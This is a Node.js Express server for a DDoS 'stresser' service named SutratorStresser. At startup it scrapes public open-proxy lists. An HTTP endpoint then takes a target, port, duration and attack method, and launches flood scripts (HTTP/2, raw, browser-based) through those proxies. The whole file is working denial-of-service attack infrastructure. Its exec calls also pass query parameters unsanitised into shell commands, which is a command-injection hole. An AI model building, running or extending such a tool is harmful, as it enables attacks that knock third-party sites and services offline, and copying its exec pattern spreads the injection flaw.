const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = 5022;

const fetch = require("node-fetch");
const path = require('path');
const ProxyAgent = require("proxy-agent");

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt",
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

app.get('/Sutrator', (req, res) => {
  const { target, port, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Nusantara',
    target,
    port,
    time,
    methods
  });

  
       if (methods === 'PRIV-RQO') {
    exec(`node high-dstat.js ${target} ${time} 8 3 proxy.txt`);
    } else if (methods === 'RAW') {
    exec(`node raw.js ${target} ${time}`);
    } else if (methods === 'PRIV-CF') {
    exec(`node h2-txorzsange.js ${target} ${time} 70 7 proxy.txt`);
    } else if (methods === 'BROWSERN') {
    exec(`python3 browser.py ${target} ${time}`);
    } else if (methods === 'BROWSER') {
    exec(`python3 browsern.py ${target} ${time}`);
    } else if (methods === 'HOLD-PANEL') {
    exec(`node http-panel.js ${target} ${time}`);
    } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
   scrapeProxy();
    console.log(`API SutratorStresser Started On Port: ${port}`);
});
